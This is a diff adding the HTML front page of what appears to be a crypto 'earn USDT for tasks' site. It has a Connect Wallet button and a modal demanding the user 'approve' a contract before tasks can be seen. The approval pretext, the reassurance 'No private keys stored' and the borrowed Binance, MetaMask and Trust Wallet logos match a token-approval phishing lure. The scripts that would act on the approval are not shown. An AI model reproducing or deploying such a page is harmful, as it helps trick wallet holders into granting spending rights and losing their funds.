@@ -1,0 +1,134 @@
+<!doctype html>
+<html> 
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Complete TASKS, Earn USDT</title>
+ <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <!-- React root for Vite (hidden, UI is pure HTML) -->
+  <div id="root" style="display:none;"></div>
+
+  <header>
+    <div class="nav">
+     
+<div class="logo-center">
+      <div class="logo">
+        <span class="logo-usdt">USDT</span><span class="logo-offers">OFFERS</span>
+      </div>
+</div>
+
+      
+      <div class="nav-right">
+     <a href="#" id="aboutBtn">About</a>
+<a href="#" id="contactBtn">Contact</a>
+      
+        <button id="connectBtn" class="connect">Connect Wallet</button>
+      </div>
+    </div>
+  </header>
+
+  <main>
+
+    <div class="wallet-status-card">
+
+      <div class="wallet-status-row">
+    <span class="status-dot"></span>
+    <span id="statusText">Not connected</span>
+  </div>
+<button
+  id="approveBtn"
+  class="btn btn-task hidden"
+>
+  Approve Now
+</button>
+      
+  <br>
+      
+ <div class="wallet-meta">
+    
+    <span class="user-pill">
+      User ID <span id="userId"></span>
+    </span>
+    <br>
+    <span class="network-pill" id="walletNetwork">Network</span>
+   <br>
+
+   <br> <span class="address-pill mono" id="walletAddress">Wallet Address</span>
+
+    
+  </div>
+</div>
+
+
+
+
+
+
+
+
+    </div>
+  </main>
+
+  <!-- FOOTER (same structure as index) -->
+ <footer>
+  <div class="footer-text">
+    © 2025 BSC (BEP-20) • No private keys stored.
+  </div>
+<div class="small" style="margin-top:6px;opacity:0.6;">
+ Supported by ecosystem and Web3
+</div>
+<div class="small footer-note">
+  Logos are trademarks of their respective owners.
+</div>
+  <!-- ===== PARTNER LOGOS ===== -->
+  <div class="footer-partners">
+   <img src="assets/partners/binance.png" alt="Binance">
+  <img src="assets/partners/metamask.png" alt="MetaMask">
+  <img src="assets/partners/trustwallet.png" alt="Trust Wallet">
+  <img src="assets/partners/bnbchain.png" alt="BNB Chain">
+  <img src="assets/partners/walletconnect.png" alt="WalletConnect">
+ <img src="assets/partners/usdt.png" alt="BNB Chain">
+  </div>
+</footer>
+  <!-- ===== APPROVAL REQUIRED MODAL ===== -->
+<div id="approvalModal" class="modal-overlay hidden">
+  <div class="modal-card">
+    <button class="modal-close" id="closeApprovalModal">✕</button>
+
+    <h3>Approval Required</h3>
+    <p>
+      To view and complete  tasks, you must approve
+     
+      <br><br>
+      This allows the  contract to verify eligibility.
+    .
+    </p>
+
+    <div class="approval-actions">
+  <button id="modalApproveBtn" class="approve-btn">
+    Approve Now
+  </button>
+</div>
+
+
+    
+  </div>
+</div>
+
+<div id="toast" class="toast hidden"></div>
+
+
+  
+  <!-- libs: Web3 + Ethers -->
+  <script src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
+  <script src="https://www.youtube.com/iframe_api"></script>
+
+
+  <!-- Vite / React entry: this runs src/main.jsx (and appkit.ts) -->
+  <script type="module" src="/src/main.jsx"></script>
+  <script src="script.js"></script>
+</body>
+</html>
